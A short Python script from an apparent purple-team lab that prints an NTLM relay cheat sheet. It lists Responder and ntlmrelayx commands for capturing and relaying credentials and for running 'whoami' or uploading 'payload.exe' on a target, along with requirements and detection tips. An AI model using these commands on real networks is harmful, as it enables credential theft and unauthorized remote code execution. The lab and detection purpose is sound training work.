#!/usr/bin/env python3
"""
NTLM Relay Attack (MITRE ATT&CK: T1557.001)

Relays NTLM authentication to gain unauthorized access

Author: Purple Team Lab
MITRE ATT&CK: T1557.001 - Adversary-in-the-Middle: LLMNR/NBT-NS Poisoning
Date: 2024-01-14

Usage:
    python3 ntlm_relay.py -t 172.28.0.20
"""

import argparse

class Colors:
    OKGREEN = '\033[92m'
    OKBLUE = '\033[94m'
    WARNING = '\033[93m'
    ENDC = '\033[0m'

def main():
    parser = argparse.ArgumentParser(description='NTLM Relay Attack')
    parser.add_argument('-t', '--target', required=True, help='Target IP')
    args = parser.parse_args()

    print(f"{Colors.OKBLUE}{'='*70}{Colors.ENDC}")
    print(f"{Colors.OKBLUE}NTLM Relay Attack - MITRE ATT&CK T1557.001{Colors.ENDC}")
    print(f"{Colors.OKBLUE}{'='*70}{Colors.ENDC}\n")

    print(f"[*] Target: {args.target}\n")

    print(f"{Colors.OKGREEN}[*] Method 1: Responder + ntlmrelayx{Colors.ENDC}")
    print("    # Terminal 1: Capture credentials")
    print("    responder -I eth0 -wv")
    print("\n    # Terminal 2: Relay to target")
    print(f"    ntlmrelayx.py -tf targets.txt -smb2support -c 'whoami'")

    print(f"\n{Colors.OKGREEN}[*] Method 2: SMB Relay{Colors.ENDC}")
    print(f"    ntlmrelayx.py -t {args.target} -smb2support -e payload.exe")

    print(f"\n{Colors.WARNING}[!] Requirements:{Colors.ENDC}")
    print("    - SMB signing disabled on target")
    print("    - Victim must authenticate to attacker")

    print(f"\n{Colors.OKGREEN}[+] Detection:{Colors.ENDC}")
    print("    - Event ID 4624 (unusual source IP)")
    print("    - Network traffic analysis")
    print("    - Enable SMB signing")

if __name__ == '__main__':
    main()
